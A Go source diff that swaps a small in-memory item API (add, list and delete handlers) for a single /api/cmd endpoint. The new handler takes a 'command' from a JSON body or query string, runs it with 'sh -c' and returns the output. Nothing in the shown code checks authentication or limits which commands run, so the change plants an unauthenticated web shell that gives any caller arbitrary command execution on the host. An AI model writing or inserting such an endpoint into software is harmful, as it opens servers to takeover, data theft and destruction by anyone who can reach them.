@@ -4,20 +4,17 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
-	"strconv"
-	"sync"
+	"os/exec"
 )
 
-type Item struct {
-	ID   int    `json:"id"`
-	Name string `json:"name"`
+type CmdReq struct {
+	Command string `json:"command"`
 }
 
-var (
-	items  = make(map[int]Item)
-	nextID = 1
-	mu     sync.Mutex
-)
+type CmdRes struct {
+	Output string `json:"output"`
+	Error  string `json:"error,omitempty"`
+}
 
 func main() {
 	http.HandleFunc("/api/cmd", handler)
@@ -28,63 +25,44 @@ func main() {
 func handler(w http.ResponseWriter, r *http.Request) {
 	switch r.Method {
 	case http.MethodPost:
-		addItem(w, r)
-	case http.MethodGet:
-		getItems(w)
-	case http.MethodDelete:
-		deleteItem(w, r)
+		execCmd(w, r)
 	default:
 		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
 	}
 }
 
-func addItem(w http.ResponseWriter, r *http.Request) {
-	var item Item
-	if err := json.NewDecoder(r.Body).Decode(&item); err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
-		return
+func execCmd(w http.ResponseWriter, r *http.Request) {
+	var cmdReq CmdReq
+
+	if r.Header.Get("Content-Type") == "application/json" {
+		if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
+			http.Error(w, "Invalid request body", http.StatusBadRequest)
+			return
+		}
+	} else {
+		cmdReq.Command = r.URL.Query().Get("command")
+		if cmdReq.Command == "" {
+			http.Error(w, "Command not provided", http.StatusBadRequest)
+			return
+		}
 	}
 
-	mu.Lock()
-	item.ID = nextID
-	nextID++
-	items[item.ID] = item
-	mu.Unlock()
+	cmd := exec.Command("sh", "-c", cmdReq.Command)
+	output, err := cmd.CombinedOutput()
+	exitError, ok := err.(*exec.ExitError)
 
-	w.WriteHeader(http.StatusCreated)
-	json.NewEncoder(w).Encode(item)
-}
-
-func getItems(w http.ResponseWriter) {
-	mu.Lock()
-	defer mu.Unlock()
-
-	itemList := make([]Item, 0, len(items))
-	for _, item := range items {
-		itemList = append(itemList, item)
-	}
-
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(itemList)
-}
-
-func deleteItem(w http.ResponseWriter, r *http.Request) {
-	idStr := r.URL.Query().Get("id")
-	if idStr == "" {
-		http.Error(w, "ID not provided", http.StatusBadRequest)
-		return
-	}
-	id, err := strconv.Atoi(idStr)
 	if err != nil {
-		http.Error(w, "Invalid ID format", http.StatusBadRequest)
+		if ok && exitError.ExitCode() == 127 {
+			errMessage := fmt.Sprintf("Error: Command not found (status code: %d)", http.StatusNotFound)
+			http.Error(w, errMessage, http.StatusNotFound)
+		} else {
+			errMessage := fmt.Sprintf("Error: %s (status code: %d)", string(output), http.StatusBadRequest)
+			http.Error(w, errMessage, http.StatusBadRequest)
+		}
 		return
 	}
-	mu.Lock()
-	defer mu.Unlock()
-	if _, exists := items[id]; !exists {
-		http.Error(w, "Item not found", http.StatusNotFound)
-		return
-	}
-	delete(items, id)
-	w.WriteHeader(http.StatusNoContent)
+
+	cmdRes := CmdRes{Output: string(output)}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(cmdRes)
 }
